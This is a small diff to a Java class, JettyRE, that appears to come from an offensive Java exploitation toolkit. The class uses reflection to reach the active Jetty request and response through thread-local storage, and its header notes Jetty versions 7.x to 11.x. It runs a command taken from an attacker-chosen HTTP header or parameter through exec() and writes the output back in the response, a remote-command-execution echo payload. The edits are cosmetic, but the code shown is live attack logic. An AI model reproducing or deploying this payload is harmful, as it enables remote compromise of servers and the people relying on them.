@@ -9,7 +9,7 @@ import java.lang.reflect.Method;
 
 /**
  * @author Whoopsunix
- *
+ * <p>
  * TargetObject = {java.lang.Thread}
  * ---> threadLocals = {java.lang.ThreadLocal$ThreadLocalMap}
  * ---> table = {class [Ljava.lang.ThreadLocal$ThreadLocalMap$Entry;}
@@ -17,7 +17,7 @@ import java.lang.reflect.Method;
  * ---> value = {org.eclipse.jetty.server.AsyncHttpConnection}
  * ---> _request = {org.eclipse.jetty.server.Request}
  * idea_express: TargetObject.threadLocals.get("table").get("13").get("value")._request
- *
+ * <p>
  * Vsersion test
  * 7.x、8.x、9.x、10.x、11.x
  */
@@ -57,14 +57,14 @@ public class JettyRE {
                 if (response == null)
                     continue;
 
-                String header = (String) request.getClass().getDeclaredMethod("getHeader", String.class).invoke(request, HEADER);
-                String param = (String) request.getClass().getDeclaredMethod("getParameter", String.class).invoke(request, PARAM);
+                Object header = request.getClass().getDeclaredMethod("getHeader", String.class).invoke(request, HEADER);
+                Object param = request.getClass().getDeclaredMethod("getParameter", String.class).invoke(request, PARAM);
 
                 String result = null;
                 if (header != null) {
-                    result = exec(header);
+                    result = exec((String) header);
                 } else if (param != null) {
-                    result = exec(param);
+                    result = exec((String) param);
                 }
 
                 Object writer = response.getClass().getDeclaredMethod("getWriter").invoke(response);
